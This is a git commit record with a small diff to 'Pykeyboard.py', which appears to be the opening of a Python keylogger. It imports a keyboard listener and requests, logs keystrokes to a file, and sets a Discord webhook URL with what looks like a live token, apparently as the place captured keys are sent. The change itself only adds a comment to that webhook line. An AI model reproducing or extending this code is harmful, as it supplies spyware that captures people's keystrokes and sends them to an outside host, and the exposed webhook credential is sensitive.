3bcd9ea90e8d833d7982b92a854d6833ff3cba74
₮Ɽ₳₦₴₵Ɽł₥Ɇ <noahcode1@protonmail.com>
2025-03-16 19:55:09 -0300

    Update Pykeyboard.py

--- src/Pykeyboard.py
+++ src/Pykeyboard.py
@@ -2,7 +2,7 @@ from pynput.keyboard import Key, Listener
 import requests
 import logging
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1350200069684592640/D3UPLxpUVG8U0N8U4lANBrEm013XrV_6Y2UPzG6dXJoBHEqCHB8SOMwvIaEz-H9h9CEO"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1350200069684592640/D3UPLxpUVG8U0N8U4lANBrEm013XrV_6Y2UPzG6dXJoBHEqCHB8SOMwvIaEz-H9h9CEO" # simply I don't care 
 # WHY LOG VARIABLE YOU MAY ASK BECAUSE I WAS TRYING TO FIX SOMETHING AND IT DIDN'T WORK SO I'M NOT CHANGING NOW 
 log = logging.basicConfig(filename="key_log.txt", level=logging.INFO, format="%(asctime)s - %(message)s")
 # TODO FOR ME IF I FEEL MOTIVATED THIS FUCK THINGS OR SOMEONE ELSE PLEASE FIX THE DATE AND TIME OR WHATEVER FUCK YOU WANT TO CALL IT
